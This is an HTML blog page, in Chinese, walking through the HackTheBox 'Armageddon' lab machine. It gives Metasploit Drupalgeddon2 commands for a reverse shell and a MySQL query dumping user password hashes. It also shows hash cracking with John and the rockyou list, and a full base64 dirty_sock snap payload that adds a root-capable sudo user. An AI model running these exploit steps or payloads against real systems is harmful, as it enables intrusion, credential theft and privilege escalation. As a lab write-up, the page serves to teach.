@@ -1,0 +1,805 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+
+    
+
+    
+
+
+
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
+    
+    
+    
+    
+    <title>Hackthebox - Armageddon 靶场实战 | Lucifiel&#39;s Blog | Lucifiel 技术博客</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#3F51B5">
+    
+    
+    <meta name="keywords" content="Hackthebox">
+    <meta name="description" content="靶场信息                                                                                             image               靶场类型">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hackthebox - Armageddon 靶场实战">
+<meta property="og:url" content="http://www.lucifiel.com/2022/08/04/Armageddon/index.html">
+<meta property="og:site_name" content="Lucifiel&#39;s Blog">
+<meta property="og:description" content="靶场信息                                                                                             image               靶场类型">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://www.lucifiel.com/2022/08/04/Armageddon/image1.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/08/04/Armageddon/image2.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/08/04/Armageddon/image3.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/08/04/Armageddon/image4.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/08/04/Armageddon/image5.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/08/04/Armageddon/image6.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/08/04/Armageddon/image7.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/08/04/Armageddon/image8.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/08/04/Armageddon/image9.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/08/04/Armageddon/image10.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/08/04/Armageddon/image11.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/08/04/Armageddon/image12.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/08/04/Armageddon/image13.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/08/04/Armageddon/image14.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/08/04/Armageddon/image15.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/08/04/Armageddon/image16.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/08/04/Armageddon/image17.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/08/04/Armageddon/image18.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/08/04/Armageddon/image19.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/08/04/Armageddon/image20.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/08/04/Armageddon/image21.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/08/04/Armageddon/image22.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/08/04/Armageddon/image23.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/08/04/Armageddon/image24.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/08/04/Armageddon/image25.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/08/04/Armageddon/image26.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/08/04/Armageddon/image27.png">
+<meta property="article:published_time" content="2022-08-04T03:14:26.000Z">
+<meta property="article:modified_time" content="2023-05-17T08:54:16.000Z">
+<meta property="article:author" content="Lucifiel">
+<meta property="article:tag" content="Hackthebox">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://www.lucifiel.com/2022/08/04/Armageddon/image1.png">
+    
+        <link rel="alternate" type="application/atom+xml" title="Lucifiel&#39;s Blog" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+<meta name="generator" content="Hexo 4.2.1"><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>
+
+<body>
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">Lucifiel</h5>
+          <a href="mailto:LucifielHack@qq.com" title="LucifielHack@qq.com" class="mail">LucifielHack@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                Archives
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                Tags
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                Categories
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/LucifielHack" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/about"  >
+                <i class="icon icon-lg icon-user"></i>
+                About
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">Hackthebox - Armageddon 靶场实战</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">Hackthebox - Armageddon 靶场实战</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2022-08-04T03:14:26.000Z" itemprop="datePublished" class="page-time">
+  2022-08-04
+</time>
+
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#靶场信息"><span class="post-toc-number">1.</span> <span class="post-toc-text">靶场信息</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#靶场类型"><span class="post-toc-number">2.</span> <span class="post-toc-text">靶场类型</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#信息搜集"><span class="post-toc-number">3.</span> <span class="post-toc-text">信息搜集</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#NMAP"><span class="post-toc-number">3.1.</span> <span class="post-toc-text">NMAP</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#漏洞利用"><span class="post-toc-number">4.</span> <span class="post-toc-text">漏洞利用</span></a></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-Armageddon"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">Hackthebox - Armageddon 靶场实战</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2022-08-04 11:14:26" datetime="2022-08-04T03:14:26.000Z"  itemprop="datePublished">2022-08-04</time>
+
+            
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <h1 id="靶场信息"><a href="#靶场信息" class="headerlink" title="靶场信息"></a>靶场信息</h1><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2022/08/04/Armageddon/image1.png" alt="image" title>
+                </div>
+                <div class="image-caption">image</div>
+            </figure>
+
+<h1 id="靶场类型"><a href="#靶场类型" class="headerlink" title="靶场类型"></a>靶场类型</h1><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2022/08/04/Armageddon/image2.png" alt="image" title>
+                </div>
+                <div class="image-caption">image</div>
+            </figure>
+
+<h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><h2 id="NMAP"><a href="#NMAP" class="headerlink" title="NMAP"></a>NMAP</h2><p>首先使用nmap进行扫描</p>
+<p>nmap –A -sS –sC –Sv 10.10.10.233</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2022/08/04/Armageddon/image3.png" alt="image" title>
+                </div>
+                <div class="image-caption">image</div>
+            </figure>
+
+<p>我们可以看到开启了22和80端口</p>
+<p>在80端口提示了我们存在robots.txt文件，并且东西很多 咱们访问一下</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2022/08/04/Armageddon/image4.png" alt="image" title>
+                </div>
+                <div class="image-caption">image</div>
+            </figure>
+
+<p>其中引起我兴趣的东西呢就是&#x2F;MAINTAINERS.txt文件了</p>
+<p>这是维护文件，或者说是升级文件，咱们打开看一下</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2022/08/04/Armageddon/image5.png" alt="image" title>
+                </div>
+                <div class="image-caption">image</div>
+            </figure>
+
+<p>果不其然，里面揭露了Drupal的版本</p>
+<p>到这里思路就明了了</p>
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>咱们直接使用msf进行getshell</p>
+<p>使用msfconsole打开msf</p>
+<p>输入search drupal搜索可用的exp</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2022/08/04/Armageddon/image6.png" alt="image" title>
+                </div>
+                <div class="image-caption">image</div>
+            </figure>
+
+<p>咱们对比一下版本号，最后一次升级为7.56版本，升级时间为2017-06-21 也就是说在这之前的exp都可以直接pass了</p>
+<p>咱们把目光放在2018-03-28的exp上</p>
+<pre><code>use exploit/unix/webapp/drupal_drupalgeddon2
+
+option
+
+set RHOSTS 10.10.10.233
+
+set lhost 10.10.14.135
+
+exploit
+</code></pre>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2022/08/04/Armageddon/image7.png" alt="image" title>
+                </div>
+                <div class="image-caption">image</div>
+            </figure>
+
+<p>成功获取到一个shell</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2022/08/04/Armageddon/image8.png" alt="image" title>
+                </div>
+                <div class="image-caption">image</div>
+            </figure>
+
+<p>咱们运行一下无法查看到uid，但是可以查看到文件</p>
+<p>但我偏不，我就想知道当前用户怎么办？</p>
+<p>简单</p>
+<p>输入shell</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2022/08/04/Armageddon/image9.png" alt="image" title>
+                </div>
+                <div class="image-caption">image</div>
+            </figure>
+
+<p>一开始我以为是卡住了，但后来想想不对，好像是获取到了</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2022/08/04/Armageddon/image10.png" alt="image" title>
+                </div>
+                <div class="image-caption">image</div>
+            </figure>
+
+<p>执行命令后确认命令是可以被执行的？</p>
+<p>那咱们先想办法获得一个稳定的shell吧</p>
+<p>&#x2F;bin&#x2F;bash –i</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2022/08/04/Armageddon/image11.png" alt="image" title>
+                </div>
+                <div class="image-caption">image</div>
+            </figure>
+
+<p>不一样被我搞到shell了，可给我NB坏了，叉会儿腰</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2022/08/04/Armageddon/image12.png" alt="image" title>
+                </div>
+                <div class="image-caption">image</div>
+            </figure>
+
+<p>用户是apache，权限还是有点低啊，咱们在内核里看到了一个域名，或许有用，先记录下来吧，暂时还不知道是干嘛的，咱们得想想办法去搞到更高一点的权限</p>
+<p>我在查看源码和配置文件的时候，在..&#x2F;sites&#x2F;default&#x2F;settings.php中找到了数据库的账号密码</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2022/08/04/Armageddon/image13.png" alt="image" title>
+                </div>
+                <div class="image-caption">image</div>
+            </figure>
+
+<pre><code>database =&gt; drupal
+
+username =&gt; drupaluser
+
+password =&gt; CQHEy@9M*m23gBVj
+</code></pre>
+<p>他不是开启了22端口吗，咱们直接ssh登录吧</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2022/08/04/Armageddon/image14.png" alt="image" title>
+                </div>
+                <div class="image-caption">image</div>
+            </figure>
+
+<p>嗯？密码不对？啊这，就有点尴尬了呀</p>
+<p>没事儿，咱们换一种方法，既然从外面来不行，那咱们就从里面来，咳咳 没开车哈 请不要脑补</p>
+<p>在咱们的shell里直接使用mysql进行登录</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2022/08/04/Armageddon/image15.png" alt="image" title>
+                </div>
+                <div class="image-caption">image</div>
+            </figure>
+
+<p>很奇怪，正常输入账号密码会卡住或者报错或者出现一些奇怪的东西</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2022/08/04/Armageddon/image16.png" alt="image" title>
+                </div>
+                <div class="image-caption">image</div>
+            </figure>
+
+<p>经过多方测试以及查找资料后，得出正确的查询命令</p>
+<pre><code>mysql -u &quot;drupaluser&quot; -h &quot;localhost&quot; &quot;-pCQHEy@9M*m23gBVj&quot; &quot;drupal&quot; -e &quot;select uid, name, pass from users;&quot;
+</code></pre>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2022/08/04/Armageddon/image17.png" alt="image" title>
+                </div>
+                <div class="image-caption">image</div>
+            </figure>
+
+<p>brucetherealadmin账户一看这么长就知道不简单，俗话说的好，长的人一定不简单，咋办？爆它！</p>
+<p>将用户brucetherealadmin的hash保存为一个文本文件</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2022/08/04/Armageddon/image18.png" alt="image" title>
+                </div>
+                <div class="image-caption">image</div>
+            </figure>
+
+<p>请出我们的神器john</p>
+<pre><code>john --wordlist=/usr/share/wordlists/rockyou.txt admin
+</code></pre>
+<p>爆破成功</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2022/08/04/Armageddon/image19.png" alt="image" title>
+                </div>
+                <div class="image-caption">image</div>
+            </figure>
+
+<p>密码为booboo</p>
+<p>现在咱们直接ssh登录就可以了</p>
+<p>ssh <a href="mailto:brucetherealadmin@10.10.10.233">brucetherealadmin@10.10.10.233</a></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2022/08/04/Armageddon/image20.png" alt="image" title>
+                </div>
+                <div class="image-caption">image</div>
+            </figure>
+
+<p>OK，咱们现在总算是有一个完整的用户权限了</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2022/08/04/Armageddon/image21.png" alt="image" title>
+                </div>
+                <div class="image-caption">image</div>
+            </figure>
+
+<p>成功获得user权限的flag</p>
+<p><strong>权限提升</strong></p>
+<p>咱们使用sudo –l来查看一下sudo权限</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2022/08/04/Armageddon/image22.png" alt="image" title>
+                </div>
+                <div class="image-caption">image</div>
+            </figure>
+
+<p>咱们可以不使用密码就调用root权限安装snap，那思路就有了呀，搞起来兄弟们</p>
+<p>生成一个snap的马</p>
+<p>参考链接：</p>
+<blockquote>
+<p>Privilege Escalation in Ubuntu Linux (dirty_sockv2 exploit)：<a href="https://shenaniganslabs.io/2019/02/13/Dirty-Sock.html" target="_blank" rel="noopener">https://shenaniganslabs.io/2019/02/13/Dirty-Sock.html</a></p>
+</blockquote>
+<blockquote>
+<p>Playing with Dirty Sock：<a href="https://0xdf.gitlab.io/2019/02/13/playing-with-dirty-sock.html" target="_blank" rel="noopener">https://0xdf.gitlab.io/2019/02/13/playing-with-dirty-sock.html</a></p>
+</blockquote>
+<p>生成指令：</p>
+<pre><code>python2 -c &#39;print&quot;aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD//////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJhZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERoT2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawplY2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFtZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZvciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5nL2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZtb2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAerFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUjrkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAAAAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAAAFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw&quot;+ &quot;A&quot;*4256 + &quot;==&quot;&#39; | base64 -d &gt; exploit.snap
+</code></pre>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2022/08/04/Armageddon/image23.png" alt="image" title>
+                </div>
+                <div class="image-caption">image</div>
+            </figure>
+
+<p>直接运行改文件，发现还有一点错误，需要想办法解决一下</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2022/08/04/Armageddon/image24.png" alt="image" title>
+                </div>
+                <div class="image-caption">image</div>
+            </figure>
+
+<p>加上 –devmode 成功安装</p>
+<p>sudo &#x2F;usr&#x2F;bin&#x2F;snap install –devmode exploit.snap</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2022/08/04/Armageddon/image25.png" alt="image" title>
+                </div>
+                <div class="image-caption">image</div>
+            </figure>
+
+<p>切换到dirty_sock用户，密码也是dirty_sock</p>
+<p>查看一下权限</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2022/08/04/Armageddon/image26.png" alt="image" title>
+                </div>
+                <div class="image-caption">image</div>
+            </figure>
+
+<p>提权成功</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2022/08/04/Armageddon/image27.png" alt="image" title>
+                </div>
+                <div class="image-caption">image</div>
+            </figure>
+
+<p>成功拿到root权限的flag</p>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <footer>
+        <a href="http://www.lucifiel.com">
+            <img src="/img/avatar.jpg" alt="Lucifiel">
+            Lucifiel
+        </a>
+    </footer>
+</blockquote>
+
+        
+<div class="page-reward">
+    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
+</div>
+
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Hackthebox/" rel="tag">Hackthebox</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2022/08/04/Armageddon/&title=《Hackthebox - Armageddon 靶场实战》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2022/08/04/Armageddon/&title=《Hackthebox - Armageddon 靶场实战》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2022/08/04/Armageddon/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Hackthebox - Armageddon 靶场实战》 — Lucifiel's Blog&url=http://www.lucifiel.com/2022/08/04/Armageddon/&via=http://www.lucifiel.com" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2022/08/04/Armageddon/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/2022/08/06/OSCP%E9%9A%8F%E7%AC%94/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">OSCP随笔</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2022/05/05/Overpass/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">TryHackMe - Overpass 靶场实战</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<section class="comments" id="comments">
+    <div id="gitalk-container"></div>
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+        var id = location.pathname
+        if (location.pathname.length > 50) {
+          id = location.pathname.replace(/\/\d+\/\d+\/\d+\//, '').replace('/', '').substring(0, 50)
+        }
+        const gitalk = new Gitalk({
+          clientID: '',
+          clientSecret: '',
+          repo: '',
+          owner: '',
+          admin: [''],
+          id: id,      // Ensure uniqueness and length less than 50
+          title: document.title.split('|')[0],
+          distractionFreeMode: false  // Facebook-like distraction free mode
+        })
+
+        gitalk.render('gitalk-container')
+    </script>
+</section>
+
+
+
+
+</article>
+
+<div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        谢谢大爷~
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" src="/false" alt="打赏二维码">
+        </div>
+        
+    </div>
+</div>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            
+                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
+            
+            <span>博客内容遵循 <a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span>
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>Lucifiel &copy; 2020 - 2023</span>
+            <span>
+                
+                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2022/08/04/Armageddon/&title=《Hackthebox - Armageddon 靶场实战》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2022/08/04/Armageddon/&title=《Hackthebox - Armageddon 靶场实战》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2022/08/04/Armageddon/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Hackthebox - Armageddon 靶场实战》 — Lucifiel's Blog&url=http://www.lucifiel.com/2022/08/04/Armageddon/&via=http://www.lucifiel.com" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2022/08/04/Armageddon/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
